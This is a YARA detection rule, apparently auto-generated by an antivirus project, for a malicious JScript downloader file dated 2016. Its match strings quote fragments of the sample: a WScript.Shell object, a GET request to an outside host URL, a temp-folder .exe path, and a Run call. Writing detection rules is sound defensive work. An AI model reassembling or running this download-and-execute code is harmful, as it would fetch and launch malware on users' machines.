rule sig_20160328_db2358857f85b8a739698634bbf17b72 {
  meta:
    description = "datamaliciousorder - file 20160328_db2358857f85b8a739698634bbf17b72.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "d0b68f2fac11e7a0678f5d2b02e092328227310d32b9286c0ae744609a77e8a9"

  strings:
    $s1  = "function Xvzsfow() {return Hczwyi[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"MTzNxxXSB.exe\";};" fullword ascii
    $s2  = "Bdutj[Ylcefl](\"GET\", \"http://2biking.com/k4isfa\", false);" fullword ascii
    $s3  = "do {WScript[Qubxmxai](Tlvwwzmrb() * 11)} while (Bdutj[\"readystate\"] < 4 );" fullword ascii
    $s4  = "function Wfmxyh(Madwpmnp, Kopeioan){return Madwpmnp - Kopeioan;};" fullword ascii
    $s5  = "var Hczwyi = function Zcfpoalj() {return WScript[Ycpliwm](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Xnbjx(Eyqgfj){Hczwyi[\"Run\"](Eyqgfj, Vuqqgjhn, Vuqqgjhn);};" fullword ascii
    $s7  = "function Udnedc() {return ((Mtfdpr == true) && (Mtfdpr == Szvhix)) ? 1 : Vuqqgjhn;};" fullword ascii
    $s8  = "Szvhix = true; " fullword ascii
    $s9  = "var Ugdbctlqi = new this[\"Date\"]();" fullword ascii
    $s10 = "var Szvhix = false;" fullword ascii
    $s11 = "function Glugf()" fullword ascii
    $s12 = "function Wrjjswvwmn(){return Ycpliwm;};" fullword ascii
    $s13 = "Mtfdpr = true; " fullword ascii
    $s14 = "function Tueuk(){return Ropcw;};" fullword ascii
    $s15 = " while (Quqfhk){" fullword ascii
    $s16 = "var Mtfdpr = false;" fullword ascii
    $s17 = "function Tlvwwzmrb(){return 22;};" fullword ascii
    $s18 = "function Mmlbzo(Nwoqwrpty) {var Oamlk = (1, 2, 3, 4, 5, Nwoqwrpty); return Oamlk;};" fullword ascii
    $s19 = "return Wfmxyh(Bzskzlbm, Nhrhrphtkc);" fullword ascii
    $s20 = "var Qgoiqmpfcr = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}